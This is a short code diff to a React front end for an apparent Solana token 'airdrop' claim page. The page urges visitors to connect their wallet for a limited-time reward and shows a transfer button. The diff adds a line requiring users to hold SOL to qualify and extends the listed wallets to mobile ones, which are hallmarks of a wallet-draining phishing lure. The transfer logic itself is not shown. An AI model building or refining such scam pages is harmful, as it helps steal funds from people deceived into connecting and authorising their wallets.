@@ -37,6 +37,9 @@ export default function App() {
                     Join the next generation of DeFi. Connect your wallet and claim exclusive Solana tokens. 
                     Limited time offer with instant rewards for early adopters.
                   </p>
+                  <p className="qualification-note">
+                    Eligibility: You must have SOL in your wallet to qualify for this airdrop claim.
+                  </p>
                   <div className="space-y-4">
                     <ConnectWallet />
     <TransferButton className="
@@ -92,7 +95,7 @@ export default function App() {
 
 
           <p className="text-xs text-gray-500 mt-6 text-center">
-            Supports Phantom, Solflare, and all Wallet Standard wallets.
+            Wallet options are device-aware: mobile shows mobile wallets (including Trust Wallet and Solana mobile wallets), desktop shows desktop wallets.
           </p>
         </div>
       </WalletModalProvider>
